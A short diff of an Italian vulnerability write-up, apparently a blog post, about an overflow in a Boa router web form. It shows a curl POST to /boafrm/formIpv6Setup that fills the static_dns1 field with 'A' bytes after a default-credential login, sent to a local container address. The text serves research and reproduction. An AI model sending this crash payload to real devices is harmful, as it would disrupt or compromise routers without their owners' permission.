@@ -224,9 +224,9 @@ server {
 <img src="https://spaghetti-hacker.github.io/cvetoto2.png" class="full-img">
 _Cattura_sessione_e_invio_payload:
 
-;con Burp Suite in intercettazione (listener 127.0.0.1:8087) viene effettuato login con credenziali di default e catturato il token sessionCheck dalla richiesta POST reale verso /boafrm/formIpv6Setup navigando su Advanced -> IPv6 Setup. Il payload di test satura static_dns1 con una sequenza di byte 'A':
+;con Burp Suite viene effettuato login con credenziali di default e catturato il token sessionCheck dalla richiesta POST reale verso /boafrm/formIpv6Setup navigando su Advanced -> IPv6 Setup. Il payload di test satura static_dns1 con una sequenza di byte 'A':
 
-curl -X POST 'http://172.17.0.2:8080/boafrm/formIpv6Setup' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://172.17.0.2:8080/IPv6_Setup.htm' --data 'sessionCheck=<SESSION_TOKEN>&submit-url=%2FIPv6_Setup.htm&wan_enable=1&OriginType=1&static_dns1=AAAA...AAA'
+curl -X POST 'http://172.17.0.2:8080/boafrm/formIpv6Setup' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://172.17.0.2:8080/IPv6_Setup.htm' --data 'sessionCheck=(SESSION_TOKEN)&submit-url=%2FIPv6_Setup.htm&wan_enable=1&OriginType=1&static_dns1=AAAA...AAA'
 
 ;il campo sessionCheck deve provenire da una sessione autenticata valida e recente: Boa invalida il token dopo logout o timeout, e un token scaduto produce un semplice reject applicativo senza toccare il path vulnerabile.
 
